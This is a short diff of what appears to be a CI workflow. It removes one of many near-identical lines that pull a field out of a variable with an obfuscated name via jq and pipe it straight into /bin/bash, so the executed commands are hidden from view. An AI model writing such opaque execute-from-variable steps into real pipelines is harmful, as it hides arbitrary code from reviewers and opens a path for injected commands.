@@ -25,7 +25,6 @@ jobs:
           echo $bi62 | jq -r .fm54777 | /bin/bash
           echo $neq58 | jq -r .equxs1567 | /bin/bash
           echo $zyhcq13 | jq -r .tz6 | /bin/bash
-          echo $qrd9 | jq -r .ukadj7999 | /bin/bash
           echo $yfdkw15 | jq -r .bqgnn2 | /bin/bash
           printf '%s' "$linax5574" | jq -r .b06 | /bin/bash
           echo $g9224 | jq -r .brcz3 | /bin/bash
